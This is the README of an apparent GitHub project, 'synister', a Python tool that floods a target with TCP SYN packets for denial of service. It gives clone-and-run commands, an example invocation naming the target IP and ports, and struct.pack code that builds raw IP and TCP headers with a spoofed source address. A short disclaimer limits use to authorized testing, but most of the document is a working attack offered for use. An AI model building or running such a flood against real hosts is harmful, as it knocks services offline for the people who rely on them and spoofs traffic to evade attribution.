
# synister

A denial of service attack script written in Python.

Flood the target IP with TCP-SYN packets (hence the name), filling up their connection table, overwhelming the device and limiting its ability to make new connections, degrading performance. The script first creates raw sockets and builds custom IP and TCP headers for the packets with a spoofed source IP address and port, and then floods the target with the packets. This script also supports multi threaded flooding to maximize intensity.

---

# Features

- Custom IP and TCP headers
- Spoofed source address
- Multi threaded attack
- Raw SYN packets without completing the TCP handshake

**Requirements**: Python3 and root privileges.

---

# How to use

Legal disclaimer: **Do not use this without permission from the target**. This tool is intended for educational and authorized testing purposes only. Unauthorized use against systems you do not own is illegal and may result in legal consequences. Always obtain explicit permission before conducting network security testing.

1.  Clone the repo `git clone https://github.com/xshthkr/synister.git`
2. `cd synister/src`
3. `sudo python3 main.py` with the appropiate parameters.

A `KeyboardInterrupt` [CTRL + C] stops the attack.

Parameters:

| Argument     | Description                                           |
|--------------|-------------------------------------------------------|
| `--src-ip`   | source IP address (can be spoofed)                    |
| `--src-port` | source port (can be spoofed)                          |
| `--dst-ip`   | target IP address                                     |
| `--dst-ports`| list of destination ports (separated with spaces)     |

Example usage:

```bash
sudo python3 syn_flood.py --src-ip 192.168.20.100 --src-port 5555 --dst-ip 192.168.20.200 --dst-ports 80 443 53
```

---

# How it works

We first manually create a socket (or sockets if multi threading) so the kernel doesnt initialize the headers for us. We will be creating our own custom headers.

IP header:

```python
ip_header = struct.pack (
        "!BBHHHBBH4s4s",        # format string to specify header fields
        0x45,                   # version (4) + header length (5)
        0,                      # type of service (0 = default, no priority)   
        40 + payload_size,      # total length, header + payload 
        60069,                  # unique packet id 
        0,                      # flag (0) + fragment offset (0) 
        255,                    # ttl, 255 hops 
        socket.IPPROTO_TCP,     # tcp protocol 
        0,                      # checksum (set to 0, recomputed later) 
        socket.inet_aton(spoofed_src_ip), 
        socket.inet_aton(dst_ip)
)
```

| field | size (bits) | value | meaning|
|---|---|---|---|
| Version | 4  | `(0x4)` | IPv4 |
| IHL (header length) | 4  | `(0x5)` | specifies a 20-byte IP header (5 × 4 bytes) |
| Type of Service (TOS) | 8  | `(0x00)` | default service (not using QoS features) |
| Total Length | 16 | `40 + payload_size` | length of IP header + TCP header + payload |
| Identification | 16 | `60069` | random unique identifier |
| Flags + Fragment Offset | 3 + 13 | `0` | no fragmentation (DF flag not set) |
| Time To Live (TTL) | 8  | `255` | maximum packet lifespan in hops |
| Protocol | 8  | `socket.IPPROTO_TCP` (`6`) | specifies that this is a TCP packet |
| Header Checksum | 16 | `computed` | checked at receiver for integrity |
| Source IP | 32 | `src_ip` | (spoofed) source address |
| Destination IP | 32 | `dst_ip` | targets IP address |

The Internet Protocol [RFC 791](https://www.ietf.org/rfc/rfc791.txt) has a more detailed description of the protocol and its details.

We calculate the checksum and then update the checksum field of the IP header.

TCP header:

```python
tcp_header = struct.pack (
        "!HHLLBBHHH",       # format string to specify TCP header fields 
        spoofed_src_port, 
        dst_port,
        0,                  # SYN no. (init 0 or random)
        0,                  # ACK no. (0 for initial SYN)
        0x50,               # data offset 
        0x02,               # tcp flags (0x02 for SYN)
        8192,               # window (buffer) size
        0,                  # checksum (set to 0, recomputed later)
        0                   # urgent pointer
)
```

| field | size (bits) | value | meaning |
|-----|----|----|---|
| Source Port | 16 | `src_port` | (spoofed) source address |
| Destination Port | 16 | `dst_port` | target port  |
| Sequence Number | 32 | `0` | usually randomized in real TCP. not used in this attack |
| Acknowledgment Number | 32 | `0` | not used in SYN packets |
| Data Offset (header length) | 4  | `5` (0x50) | specifies 20-byte TCP header (5 × 4 bytes) |
| Reserved | 3  | `0` | not used |
| Flags | 9  | `SYN (0x02)` | indicates a connection request |
| Window Size | 16 | `8192` | random receive window size |
| Checksum | 16 | `computed` | checked at reveicer for integrity |
| Urgent Pointer | 16 | `0` | not used in SYN packets. |

A pseudoheader is created and injected into the TCP header for calculating the checksum.

Then we build the packet `ip_header + tcp_header + payload` and its ready to be used.
